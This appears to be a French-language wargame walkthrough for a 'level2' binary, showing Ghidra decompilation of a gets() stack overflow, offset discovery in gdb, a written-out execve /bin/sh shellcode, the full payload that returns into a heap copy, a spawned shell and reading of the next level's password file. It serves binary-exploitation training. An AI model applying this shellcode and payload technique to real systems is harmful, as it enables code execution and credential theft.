@@ -1,0 +1,64 @@
+https://owasp.org/www-chapter-sofia/assets/presentations/202510%20-%20Introduction%20to%20binary%20exploitation%20by%20Simeon%20Nguen.pdf
+
+1. ls -la
+   -> level2
+
+2. ./level2
+   test
+   -> "test" (le programme print l'entrée)
+
+3. Ghidra : Import /tmp/level2
+   Decompile de main() :
+   -> main() appele p() 
+
+4. Ghidra : Decompile de p()
+   void p(void) {
+     uint unaff_retaddr;
+     char local_50 [76];
+     fflush(stdout);
+     gets(local_50); # gets(local_50) sans limite de taille sur un buffer de 76 bytes = vulnérabilité buffer overflow
+     if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
+       printf("(%p)\n",unaff_retaddr);
+       _exit(1);  
+     }
+     puts(local_50);
+     strdup(local_50);
+   }
+
+5. Analyse du if :
+   -> 0xb0000000 en binaire = 1011 0000 ... 0000 (adresses pile sur ce système ? protections de base)
+
+6. strdup(local_50) copie le buffer dans le heap donc tranquille (pas couvert par le check)
+
+7. ltrace ./level2
+   test
+   -> strdup("test") = 0x0804a008 (on a besoin de savoir où, dans le heap, strdup va placer sa copie)
+
+8. gdb level2
+   run
+   Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3
+   -> Program received signal SIGSEGV, 0x37634136 in ?? ()
+   -> 0x37634136 = 6Ac7 (0x37 = '7', 0x63 = 'c', 0x41 = 'A', 0x36 = '6') (c'est à l'envers, après recherche c'est le little-endian, une caractéristique de l'architecture du cpu)
+
+9. python -c "print('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3'.find('6Ac7'))"
+    -> offset confirmé : 80 bytes avant l'adresse de retour
+
+10. Récupération d'un shellcode connu (21 bytes, execve /bin//sh) :
+    \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+
+11. Construction du payload :
+    shellcode (21) + "A"*59 (padding jusqu'à l'offset 80) + adresse heap en little-endian (4)
+    0x0804a008 -> \x08\xa0\x04\x08
+    python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08"' > /tmp/exploit
+
+12. cat /tmp/exploit - | ./level2
+    -> shellcode injecté, adresse de retour écrasée par 0x0804a008
+    -> strdup copie le shellcode dans le heap à cette même adresse
+    -> p() "retourne" vers le heap -> exécute le shellcode -> /bin/sh s'ouvre
+
+13. whoami
+    -> level3
+    -> l'exploit a permis d'obtenir un shell interactif au lieu d'une terminaison normale du programme
+
+14. cat /home/user/level3/.pass
+    -> (mot de passe de level3)
